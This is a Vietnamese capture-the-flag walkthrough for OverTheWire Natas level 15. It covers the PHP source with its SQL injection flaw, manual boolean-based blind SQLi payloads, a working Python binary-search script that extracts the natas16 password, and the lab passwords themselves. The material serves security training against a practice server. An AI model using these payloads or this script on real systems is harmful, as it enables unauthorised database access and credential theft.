# Level 15 -> Level 16

Username: [         ]
[Check existence]

---

## 1. THÔNG TIN TRUY CẬP (DÙNG PASSWORD TÌM ĐƯỢC TỪ NATAS 14)

- **URL**: `http://natas15.natas.labs.overthewire.org`
- **Username**: `natas15`
- **Password**: `GB6USCJYJjwLyYhZUNkE1NwDueiTow6g`
- **Giao thức xác thực**: HTTP Basic Authentication

---

## 2. THỬ THÁCH & KIẾN THỨC NỀN TẢNG CỦA LEVEL 15

### Thử thách
Giao diện trang web hiển thị một ô nhập liệu duy nhất: **Username** cùng nút bấm **Check existence** (Kiểm tra sự tồn tại của người dùng).
Khi nhập một tên người dùng, trang web sẽ trả về:
- `"This user exists."` (nếu người dùng tồn tại trong cơ sở dữ liệu).
- `"This user doesn't exist."` (nếu người dùng không tồn tại).

Mục tiêu là tìm ra mật khẩu của tài khoản **`natas16`** được lưu trữ trong cơ sở dữ liệu.

Bên dưới biểu mẫu có liên kết **`View sourcecode`**.

### Phân tích mã nguồn PHP (`index-source.html`)
Mở mã nguồn trang web, ta quan sát cấu trúc bảng và mã xử lý truy vấn:

```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
```

### Manh mối & Kiến thức cốt lõi: Tấn công Blind SQL Injection (Boolean-based Blind SQLi)

1. **Lỗ hổng SQL Injection vẫn tồn tại**:
   - Tham số `username` được ghép trực tiếp vào câu lệnh SQL bằng dấu ngoặc kép `"` mà không qua kiểm tra hay dùng Prepared Statements:
     ```php
     $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
     ```

2. **Tại sao gọi là Blind SQL Injection (SQLi "mù")?**:
   - Ở các bài trước (như Level 14), máy chủ in trực tiếp dữ liệu mật khẩu ra màn hình khi đăng nhập thành công.
   - Nhưng ở Level 15, máy chủ **hoàn toàn không in bất kỳ dữ liệu nào** từ bảng `users`. Ứng dụng chỉ trả về đúng 2 trạng thái logic nhị phân (Boolean True/False):
     - **TRUE** (`mysqli_num_rows > 0`): `"This user exists."`
     - **FALSE** (`mysqli_num_rows == 0`): `"This user doesn't exist."`
   - Kỹ thuật này được gọi là **Boolean-based Blind SQL Injection**: Kẻ tấn công sẽ đặt các câu hỏi Đúng/Sai (True/False) cho cơ sở dữ liệu để dò từng ký tự của mật khẩu.

3. **Cơ chế phân biệt chữ hoa / chữ thường trong MySQL (`BINARY`)**:
   - Trong MySQL, phép so sánh chuỗi bằng `=` hoặc `LIKE` mặc định **không phân biệt hoa thường** (`case-insensitive`): ví dụ `'a' = 'A'` sẽ trả về TRUE.
   - Mật khẩu của OverTheWire phân biệt chữ hoa, chữ thường và chữ số (`a-z`, `A-Z`, `0-9`).
   - Vì vậy, ta bắt buộc phải sử dụng từ khóa **`BINARY`** hoặc hàm **`ASCII()`** để so sánh chính xác từng ký tự:
     - `natas16" AND BINARY SUBSTRING(password, 1, 1) = "X" #`
     - `natas16" AND ASCII(SUBSTRING(password, 1, 1)) > 80 #`

4. **Chiến lược khai thác hiệu quả: Tìm kiếm nhị phân (Binary Search)**:
   - Mật khẩu dài 32 ký tự.
   - Bảng mã ASCII của các ký tự alphanumeric nằm trong khoảng từ `48` (ký tự `'0'`) đến `122` (ký tự `'z'`).
   - Nếu dò tuần tự (Brute-force tuyến tính) qua 62 ký tự khả dĩ, ta có thể cần tới $32 \times 31 \approx 1000$ request.
   - Thay vào đó, áp dụng thuật toán **Tìm kiếm nhị phân (Binary Search)** dựa trên hàm `ASCII()`:
     - Với mỗi vị trí ký tự từ $1 \rightarrow 32$, chia đôi khoảng giá trị ASCII (`low = 48`, `high = 122`).
     - Gửi câu hỏi: `natas16" AND ASCII(SUBSTRING(password, pos, 1)) > mid #`.
     - Nếu trả về *"This user exists"* (TRUE) $\rightarrow$ ký tự có mã ASCII lớn hơn `mid` $\rightarrow$ thu hẹp khoảng lên nửa trên.
     - Nếu trả về *"This user doesn't exist"* (FALSE) $\rightarrow$ thu hẹp khoảng về nửa dưới.
     - Mỗi ký tự chỉ tốn tối đa $\lceil\log_2(75)\rceil = 7$ request $\rightarrow$ Chỉ cần khoảng $32 \times 7 \approx 224$ request để lấy trọn vẹn mật khẩu!

---

## 3. CÔNG CỤ CẦN DÙNG

- **Trình duyệt Web (Chrome, Edge, Firefox)**: Thử nghiệm thủ công các payload logic để hiểu cơ chế True/False.
- **Python**: Viết script tự động hóa gửi request và dò mật khẩu bằng Binary Search (dùng thư viện có sẵn `urllib`, không cần cài đặt thêm).
- **Burp Suite**: Bắt gói tin và phân tích phản hồi.

---

## 4. CÁC BƯỚC THỰC HIỆN ĐỂ LẤY PASSWORD LEVEL 16

### Bước 1: Thử nghiệm thủ công trên trình duyệt để xác thực lỗ hổng

- Mở trình duyệt và truy cập đường dẫn:
  ```text
  http://natas15.natas.labs.overthewire.org
  ```
  Đăng nhập với tài khoản:
  - **User**: `natas15`
  - **Pass**: `GB6USCJYJjwLyYhZUNkE1NwDueiTow6g`

- **Test 1**: Kiểm tra user `natas16` có tồn tại không:
  - Nhập Username: `natas16`
  - Bấm **Check existence** $\rightarrow$ Kết quả: `"This user exists."`

- **Test 2**: Đặt câu hỏi điều kiện TRUE:
  - Nhập Username:
    ```text
    natas16" AND 1=1 #
    ```
  - Bấm **Check existence** $\rightarrow$ Kết quả: `"This user exists."`

- **Test 3**: Đặt câu hỏi điều kiện FALSE:
  - Nhập Username:
    ```text
    natas16" AND 1=2 #
    ```
  - Bấm **Check existence** $\rightarrow$ Kết quả: `"This user doesn't exist."`

$\Rightarrow$ Lỗ hổng Boolean-based Blind SQLi đã được xác nhận hoàn toàn!

---

### Bước 2: Tự động hóa trích xuất mật khẩu bằng Python Script (Khuyên dùng)

Do mật khẩu dài 32 ký tự, việc dò thủ công bằng tay sẽ rất mất thời gian. Ta sử dụng một kịch bản Python ngắn gọn sử dụng thuật toán Tìm kiếm nhị phân (Binary Search).

1. Mở tệp kịch bản [src/solve15.py](src/solve15.py) trong thư mục `src/` (nội dung chi tiết bên dưới):

```python
import urllib.request
import urllib.parse
import base64

# Cấu hình mục tiêu
url = "http://natas15.natas.labs.overthewire.org/index.php"
credentials = base64.b64encode(b"natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g").decode("ascii")

def check_condition(payload):
    data = urllib.parse.urlencode({"username": payload}).encode("utf-8")
    req = urllib.request.Request(url, data=data)
    req.add_header("Authorization", f"Basic {credentials}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            content = resp.read().decode("utf-8")
            return "This user exists" in content
    except Exception as e:
        print(f"Lỗi kết nối: {e}")
        return False

# Bắt đầu dò 32 ký tự mật khẩu của natas16 bằng Tìm kiếm nhị phân
password = ""
print("[*] Đang trích xuất mật khẩu cho natas16...")

for pos in range(1, 33):
    low = 48   # Mã ASCII ký tự '0'
    high = 122 # Mã ASCII ký tự 'z'
    
    while low <= high:
        mid = (low + high) // 2
        # Hỏi MySQL: Mã ASCII của ký tự tại vị trí pos có lớn hơn mid không?
        payload = f'natas16" AND ASCII(SUBSTRING(password, {pos}, 1)) > {mid} #'
        if check_condition(payload):
            low = mid + 1
        else:
            high = mid - 1
            
    char = chr(low)
    password += char
    print(f"Vị trí {pos:02d}: {char} -> Mật khẩu hiện tại: {password}")

print(f"\n[+] Mật khẩu hoàn chỉnh của natas16 là: {password}")
```

2. Mở Terminal (PowerShell hoặc Command Prompt) tại thư mục `Natas/` và chạy script:

```powershell
python src/solve15.py
```

4. Quan sát script tự động dò và ghép từng ký tự:
```text
[*] Đang trích xuất mật khẩu cho natas16...
Vị trí 01: X -> Mật khẩu hiện tại: X
Vị trí 02: m -> Mật khẩu hiện tại: Xm
Vị trí 03: 6 -> Mật khẩu hiện tại: Xm6
...
Vị trí 32: b -> Mật khẩu hiện tại: Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb

[+] Mật khẩu hoàn chỉnh của natas16 là: Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb
```

---

### Bước 3: Kiểm tra thử nghiệm qua Burp Suite (Tùy chọn)

- **Bước 1**: Mở trình duyệt tích hợp của Burp Suite (`Open browser`) và truy cập đường dẫn:
  ```text
  http://natas15.natas.labs.overthewire.org
  ```
  Đăng nhập với tài khoản:
  - **User**: `natas15`
  - **Pass**: `GB6USCJYJjwLyYhZUNkE1NwDueiTow6g`

- **Bước 2**: Trên biểu mẫu web, nhập `natas16" AND 1=1 #` và bấm **Check existence**.
- **Bước 3**: Trong Burp Suite, vào tab **`HTTP history`** $\rightarrow$ chọn request vừa gửi $\rightarrow$ chuột phải chọn **`Send to Repeater`**.
- **Bước 4**: Tại tab **`Repeater`**, bạn có thể thay đổi các biểu thức kiểm tra trong body:
  ```http
  username=natas16" AND BINARY SUBSTRING(password,1,1)="X" #
  ```
  Bấm **Send**: Phản hồi trả về `"This user exists."`, xác nhận ký tự đầu tiên đúng là `X`.

---

## 5. KẾT QUẢ / MẬT KHẨU LEVEL 16

```text
Password natas16: [Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb]
```
